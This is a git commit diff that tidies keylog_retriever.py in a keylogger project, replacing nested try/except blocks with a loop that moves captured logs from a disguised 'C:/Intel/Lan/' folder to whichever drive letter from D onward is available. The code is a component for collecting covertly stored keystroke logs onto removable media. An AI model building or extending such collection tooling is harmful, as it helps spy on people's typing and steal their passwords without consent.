ec6313032ce9e2e3248e5a24377b5b001a603683
Joshua Shin <josh.shin999@gmail.com>
2020-09-02 13:21:11 -0500

    changed more sloppy code

--- keylog/keylog_retriever.py
+++ keylog/keylog_retriever.py
@@ -3,27 +3,11 @@ import shutil
 save_path = 'C:/Intel/Lan/'
 home_path = ':/keylog/'
 
-try:
-    shutil.move(save_path, 'D'+home_path)
-except:
+for i in range(23):   
     try:
-        shutil.move(save_path, 'E'+home_path)
+        shutil.move(save_path, chr(i + 68) + home_path)
+        break
     except:
-        try:
-            shutil.move(save_path, 'F'+home_path)
-        except:
-            try:
-                shutil.move(save_path, 'G'+home_path)
-            except:
-                try:
-                    shutil.move(save_path, 'H'+home_path)
-                except:
-                    try:
-                        shutil.move(save_path, 'I'+home_path)
-                    except:
-                        try:
-                            shutil.move(save_path, 'J'+home_path)
-                        except:
-                            print('error')
+        continue
 
 #shutil.rmtree(save_path)
